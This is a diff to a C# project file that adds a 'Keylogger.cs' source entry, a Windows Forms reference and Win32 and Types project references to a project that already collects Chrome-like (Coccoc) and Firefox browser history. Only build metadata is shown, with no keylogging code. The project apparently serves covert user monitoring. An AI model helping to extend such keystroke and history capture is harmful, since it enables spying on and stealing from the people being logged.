@@ -32,6 +32,7 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Data" />
+    <Reference Include="System.Windows.Forms" />
   </ItemGroup>
   <ItemGroup>
     <Compile Include="Browser\History\CoccocHistoryCollector.cs" />
@@ -39,12 +40,21 @@
     <Compile Include="Browser\History\FirefoxHistoryCollector.cs" />
     <Compile Include="Browser\History\IBrowserHistoryCollector.cs" />
     <Compile Include="Browser\IBrowserCollector.cs" />
+    <Compile Include="Keylog\Keylogger.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\Db\Db.csproj">
       <Project>{9cfd3697-3d8b-4e52-a268-d6f4c8c0f9f1}</Project>
       <Name>Db</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Types\Types.csproj">
+      <Project>{55c31ead-5eb0-4dfb-b84f-e9fd3414b6ee}</Project>
+      <Name>Types</Name>
+    </ProjectReference>
+    <ProjectReference Include="..\Win32\Win32.csproj">
+      <Project>{9108b78f-55a2-4bb4-ba85-f033882c264e}</Project>
+      <Name>Win32</Name>
     </ProjectReference>
   </ItemGroup>
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
